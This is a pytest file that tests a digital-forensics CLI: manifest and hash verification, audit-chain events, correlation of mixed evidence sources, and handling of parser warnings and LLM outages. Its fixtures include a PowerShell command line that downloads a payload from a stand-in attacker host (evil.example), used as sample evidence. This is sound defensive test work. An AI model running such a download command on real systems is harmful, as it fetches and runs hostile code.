from __future__ import annotations

import hashlib
import json
from pathlib import Path

from app import main


def test_app_analyze_runs_end_to_end_and_writes_reports(monkeypatch, tmp_path, capsys):
    evidence_root = tmp_path / "evidence"
    evidence_root.mkdir()
    evtx = evidence_root / "Security.evtx"
    evtx.write_bytes(b"evtx")
    digest = hashlib.sha256(b"evtx").hexdigest()
    manifest = tmp_path / "case.yaml"
    manifest.write_text(
        f"""
case_id: case-001
evidence_root: evidence
output_root: output
evidence:
  - id: security
    path: Security.evtx
    type: EVTX
    sha256: {digest}
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        "sys.argv",
        ["app.py", "analyze", "--manifest", str(manifest), "--mode", "timeline"],
    )

    assert main() == 0
    output = capsys.readouterr().out
    audit_line = next(line for line in output.splitlines() if line.startswith("[+] Audit chain written:"))
    report_line = next(line for line in output.splitlines() if line.startswith("[+] JSON report written:"))
    object_inventory_line = next(
        line for line in output.splitlines() if line.startswith("[+] Object inventory written:")
    )
    audit_path = audit_line.split(": ", 1)[1]
    report_path = report_line.split(": ", 1)[1]
    object_inventory_path = object_inventory_line.split(": ", 1)[1]
    entries = [json.loads(line) for line in open(audit_path, encoding="utf-8")]

    event_types = [entry["event_type"] for entry in entries]
    assert event_types[:3] == ["manifest_loaded", "evidence_verified", "analysis_started"]
    assert "protocol_sift_workflow_recorded" in event_types
    assert "analysis_completed" in event_types
    assert "object_inventory_completed" in event_types
    assert "report_generation_completed" in event_types
    assert "reports_written" in event_types
    assert {entry["case_id"] for entry in entries} == {"case-001"}
    assert all(entry["session_id"] for entry in entries)
    with open(report_path, encoding="utf-8") as handle:
        report = json.load(handle)
    with open(object_inventory_path, encoding="utf-8") as handle:
        object_inventory = json.load(handle)
    assert report["case_id"] == "case-001"
    assert "cross_validation" in report
    assert object_inventory["case_id"] == "case-001"


def test_app_analyze_direct_processed_timeline_builds_events(monkeypatch, tmp_path, capsys):
    evidence_root = tmp_path / "evidence"
    evidence_root.mkdir()
    timeline = evidence_root / "timeline.csv"
    timeline.write_text(
        "datetime,message,source,filename,display_name,processid,data_type,parser\n"
        "2026-05-24T01:00:00Z,process execution,EVT,C:/Windows/System32/cmd.exe,row-1,4242,"
        "windows:evtx:record,winevtx\n",
        encoding="utf-8",
    )
    digest = hashlib.sha256(timeline.read_bytes()).hexdigest()
    manifest = tmp_path / "case.yaml"
    manifest.write_text(
        f"""
case_id: case-processed-001
evidence_root: evidence
output_root: output
evidence:
  - id: timeline
    path: timeline.csv
    type: CSV_TIMELINE
    sha256: {digest}
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        "sys.argv",
        ["app.py", "analyze", "--manifest", str(manifest), "--mode", "timeline"],
    )

    assert main() == 0
    output = capsys.readouterr().out
    assert "[+] Normalized events: 1" in output
    assert "[+] Findings: 1" in output
    batch_plan_line = next(line for line in output.splitlines() if line.startswith("[+] Batch plan written:"))
    report_line = next(line for line in output.splitlines() if line.startswith("[+] JSON report written:"))
    with open(batch_plan_line.split(": ", 1)[1], encoding="utf-8") as handle:
        batch_plan = json.load(handle)
    with open(report_line.split(": ", 1)[1], encoding="utf-8") as handle:
        report = json.load(handle)
    assert batch_plan["batches"][0]["artifact_family"] == "direct_processed"
    missing_evtx = [
        issue
        for issue in report["cross_validation"]["issues"]
        if issue["message"] == "EVTX data was expected but not observed"
    ]
    assert missing_evtx == []


def test_app_analyze_correlates_mixed_processed_evidence_inputs(monkeypatch, tmp_path, capsys):
    evidence_root = tmp_path / "evidence"
    evidence_root.mkdir()
    files = {
        "evtx.json": (
            json.dumps(
                [
                    {
                        "timestamp": "2026-05-24T01:00:00Z",
                        "event_id": 4688,
                        "channel": "Security",
                        "message": "powershell download activity",
                        "CommandLine": "powershell.exe -nop Invoke-WebRequest http://evil.example/payload.ps1",
                    }
                ]
            ).encode("utf-8"),
            "PREPROCESSED_EVTX",
        ),
        "memory.json": (
            json.dumps(
                [
                    {
                        "PID": 4242,
                        "ImageFileName": "powershell.exe",
                        "CommandLine": "powershell.exe -nop Invoke-WebRequest http://evil.example/payload.ps1",
                        "CreateTime": "2026-05-24T01:00:02Z",
                    }
                ]
            ).encode("utf-8"),
            "VOLATILITY_JSON",
        ),
        "matches.txt": (
            b"SuspiciousPowerShell C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n",
            "YARA_MATCHES",
        ),
        "strings.txt": (
            b"powershell.exe -nop Invoke-WebRequest http://evil.example/payload.ps1\n",
            "STRINGS_OUTPUT",
        ),
        "timeline.csv": (
            b"datetime,message,source,filename,display_name,processid,data_type,parser\n"
            b"2026-05-24T01:00:04Z,powershell download activity,EVT,"
            b"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,row-1,4242,"
            b"windows:evtx:record,winevtx\n",
            "CSV_TIMELINE",
        ),
    }
    rows: list[str] = []
    for index, (filename, (content, evidence_type)) in enumerate(files.items(), 1):
        (evidence_root / filename).write_bytes(content)
        rows.append(
            f"""
  - id: source-{index}
    path: {filename}
    type: {evidence_type}
    sha256: {hashlib.sha256(content).hexdigest()}
""".rstrip()
        )
    manifest = tmp_path / "case.yaml"
    manifest.write_text(
        f"""
case_id: case-mixed-inputs
evidence_root: evidence
output_root: output
evidence:
{chr(10).join(rows)}
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        "sys.argv",
        ["app.py", "analyze", "--manifest", str(manifest), "--mode", "timeline"],
    )

    assert main() == 0
    output = capsys.readouterr().out
    assert "[+] Normalized events: 5" in output
    report_line = next(line for line in output.splitlines() if line.startswith("[+] JSON report written:"))
    audit_line = next(line for line in output.splitlines() if line.startswith("[+] Audit chain written:"))
    report_path = Path(report_line.split(": ", 1)[1])
    parser_path = report_path.parent.parent / "findings" / "parser_results.json"
    with open(report_path, encoding="utf-8") as handle:
        report = json.load(handle)
    with open(audit_line.split(": ", 1)[1], encoding="utf-8") as handle:
        audit_event_types = [json.loads(line)["event_type"] for line in handle]
    with open(parser_path, encoding="utf-8") as handle:
        parser_results = json.load(handle)

    assert report["correlation_scope"]["input_evidence_count"] == 5
    assert report["correlation_scope"]["input_evidence_limit"] == 6
    assert report["correlation_scope"]["correlatable_evidence_count"] == 5
    assert report["correlation_scope"]["source_mix"] == "multi_source"
    assert set(report["correlation_scope"]["participating_evidence_ids"]) == {
        "source-1",
        "source-2",
        "source-3",
        "source-4",
        "source-5",
    }
    assert report["correlation_scope"]["evidence_without_normalized_events"] == []
    assert {result["parser"] for result in parser_results} == {"evtx", "volatility", "yara", "strings", "plaso"}
    assert "correlation_scope_recorded" in audit_event_types


def test_app_analyze_with_case_objective_writes_planning_artifacts(monkeypatch, tmp_path, capsys):
    evidence_root = tmp_path / "evidence"
    evidence_root.mkdir()
    timeline = evidence_root / "timeline.csv"
    timeline.write_text(
        "datetime,message,source,filename,display_name,processid,data_type,parser\n"
        "2026-05-24T01:00:00Z,powershell download activity,EVT,"
        "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,row-1,4242,"
        "windows:evtx:record,winevtx\n",
        encoding="utf-8",
    )
    digest = hashlib.sha256(timeline.read_bytes()).hexdigest()
    manifest = tmp_path / "case.yaml"
    manifest.write_text(
        f"""
case_id: case-alert-001
evidence_root: evidence
output_root: output
evidence:
  - id: timeline
    path: timeline.csv
    type: CSV_TIMELINE
    sha256: {digest}
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        "sys.argv",
        [
            "app.py",
            "analyze",
            "--manifest",
            str(manifest),
            "--case-objective",
            "Find PowerShell download activity using evidence only.",
            "--mode",
            "timeline",
        ],
    )

    assert main() == 0
    output = capsys.readouterr().out
    objective_line = next(line for line in output.splitlines() if line.startswith("[+] Case objective written:"))
    plan_line = next(line for line in output.splitlines() if line.startswith("[+] Investigation plan written:"))
    triage_line = next(line for line in output.splitlines() if line.startswith("[+] Evidence triage written:"))
    guidance_line = next(line for line in output.splitlines() if line.startswith("[+] Investigation guidance JSON written:"))
    report_line = next(line for line in output.splitlines() if line.startswith("[+] JSON report written:"))
    audit_line = next(line for line in output.splitlines() if line.startswith("[+] Audit chain written:"))
    with open(objective_line.split(": ", 1)[1], encoding="utf-8") as handle:
        objective = json.load(handle)
    with open(plan_line.split(": ", 1)[1], encoding="utf-8") as handle:
        plan = json.load(handle)
    with open(triage_line.split(": ", 1)[1], encoding="utf-8") as handle:
        triage = json.load(handle)
    with open(guidance_line.split(": ", 1)[1], encoding="utf-8") as handle:
        guidance = json.load(handle)
    with open(report_line.split(": ", 1)[1], encoding="utf-8") as handle:
        report = json.load(handle)
    entries = [json.loads(line) for line in open(audit_line.split(": ", 1)[1], encoding="utf-8")]
    event_types = [entry["event_type"] for entry in entries]

    assert objective["source"] == "cli"
    assert "PowerShell download activity" in objective["objective"]
    assert plan["mode"] == "evidence_first"
    assert "plaso_timeline" in plan["prioritized_artifact_families"]
    assert triage["evidence_count"] == 1
    assert triage["prioritized_evidence_ids"] == ["timeline"]
    assert report["case_objective"]["source"] == "cli"
    assert report["investigation_plan"]["mode"] == "evidence_first"
    assert report["investigation_guidance"]["schema_version"] == "investigation-guidance.v1"
    assert report["evidence_triage"]["evidence_count"] == 1
    assert guidance["schema_version"] == "investigation-guidance.v1"
    assert "case_objective_defined" in event_types
    assert "investigation_plan_completed" in event_types
    assert "investigation_guidance_generated" in event_types
    assert "evidence_triage_completed" in event_types


def test_app_analyze_deduplicates_repeated_parser_warnings(monkeypatch, tmp_path, capsys):
    evidence_root = tmp_path / "evidence"
    evidence_root.mkdir()
    evtx = evidence_root / "memory.json"
    evtx.write_bytes(b"not-json")
    digest = hashlib.sha256(b"not-json").hexdigest()
    manifest = tmp_path / "case.yaml"
    manifest.write_text(
        f"""
case_id: case-warning-001
evidence_root: evidence
output_root: output
evidence:
  - id: memory-json
    path: memory.json
    type: JSON_EXPORT
    sha256: {digest}
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        "sys.argv",
        ["app.py", "analyze", "--manifest", str(manifest), "--mode", "timeline"],
    )

    assert main() == 0
    output = capsys.readouterr().out
    report_line = next(line for line in output.splitlines() if line.startswith("[+] JSON report written:"))
    report_path = report_line.split(": ", 1)[1]
    with open(report_path, encoding="utf-8") as handle:
        report = json.load(handle)
    parser_issues = [
        issue
        for issue in report["cross_validation"]["issues"]
        if issue["message"] == "invalid JSON"
        and issue["metadata"].get("warning_type") == "PARSER_DEGRADATION"
    ]

    assert len(parser_issues) == 1


def test_app_analyze_continues_when_enabled_llm_provider_is_unavailable(monkeypatch, tmp_path, capsys):
    for key in ("LLM_PROVIDER", "LLM_BASE_URL", "LLM_API_KEY", "LLM_MODEL"):
        monkeypatch.delenv(key, raising=False)

    evidence_root = tmp_path / "evidence"
    evidence_root.mkdir()
    timeline = evidence_root / "timeline.csv"
    timeline.write_text(
        "datetime,message,source,filename,display_name,processid,data_type,parser\n"
        "2026-05-24T01:00:00Z,powershell download activity,EVT,"
        "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,row-1,4242,"
        "windows:evtx:record,winevtx\n",
        encoding="utf-8",
    )
    digest = hashlib.sha256(timeline.read_bytes()).hexdigest()
    manifest = tmp_path / "case.yaml"
    manifest.write_text(
        f"""
case_id: case-llm-provider-fail
evidence_root: evidence
output_root: output
evidence:
  - id: timeline
    path: timeline.csv
    type: CSV_TIMELINE
    sha256: {digest}
""".strip(),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        "sys.argv",
        ["app.py", "analyze", "--manifest", str(manifest), "--mode", "timeline", "--enable-reasoning"],
    )

    assert main() == 0
    output = capsys.readouterr().out
    assert "[+] LLM report verification JSON written:" in output
    assert "[+] Agent trace JSON written:" in output
    report_line = next(line for line in output.splitlines() if line.startswith("[+] JSON report written:"))
    audit_line = next(line for line in output.splitlines() if line.startswith("[+] Audit chain written:"))
    with open(report_line.split(": ", 1)[1], encoding="utf-8") as handle:
        report = json.load(handle)
    entries = [json.loads(line) for line in open(audit_line.split(": ", 1)[1], encoding="utf-8")]

    assert report["llm_report_verification"]["status"] == "not_run"
    assert report["llm_report_verification"]["reasoning_enabled"] is True
    assert report["llm_report_verification"]["issues"][0]["category"] == "reasoning_provider_failed"
    assert "analysis_completed" in [entry["event_type"] for entry in entries]
    assert any(
        entry["event_type"] == "reasoning_skipped"
        and entry["data"]["reason"] == "provider_failed"
        for entry in entries
    )
